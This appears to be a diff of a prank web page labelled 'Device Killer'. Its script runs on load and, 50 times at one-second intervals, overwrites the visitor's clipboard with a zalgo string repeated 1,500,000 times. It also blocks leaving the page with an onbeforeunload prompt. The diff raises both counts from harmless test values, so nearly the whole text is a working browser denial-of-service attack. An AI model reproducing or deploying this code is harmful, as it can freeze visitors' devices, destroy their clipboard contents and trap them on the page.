@@ -8,58 +8,40 @@
 <body>
   <p style='font-size: 100px'>Device Killer</p>
   <script>
-    window.addEventListener('load', () => {
-      spam();
-    })
-
-
-
-    function randomString(length) {
-      let result = ''
-      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
-      let counter = 0
-      while (counter < length) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length))
-        counter += 1
+    window.addEventListener('load', 
+      () => { 
+        spam()
+      });
+      window.onbeforeunload = nope
+      function nope() { 
+        return "Nope!"
       }
-      return result
+    function randomString(length) {
+        let result = '';
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let counter = 0;
+        while (counter < length) {
+          result += characters.charAt(Math.floor(Math.random() * characters.length));
+          counter += 1;
+        }
+        return result;
     }
-
-    let length = 1
-    let loops = 10
+    let length = 1500000
+    let loops = 50
     let delay = 1000
-    let msg = 'a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'
-
     function test() {
-      var dummy = document.createElement("textarea");
-      document.body.appendChild(dummy);
-      dummy.value = `${msg.repeat(length)}` + `-${randomString(5)}`
-      dummy.select();
-      document.execCommand("copy");
-      document.body.removeChild(dummy);
+        navigator.clipboard.writeText('a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(10)}`) 
+        
+      
     }
-
+      
     function spam() {
       for (let i = 0; i < loops; i++) {
-        setTimeout(test, i * delay)
+       setTimeout(test, i * delay) 
       }
+    
     }
   </script>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
   <br>
   <br>
   <br>
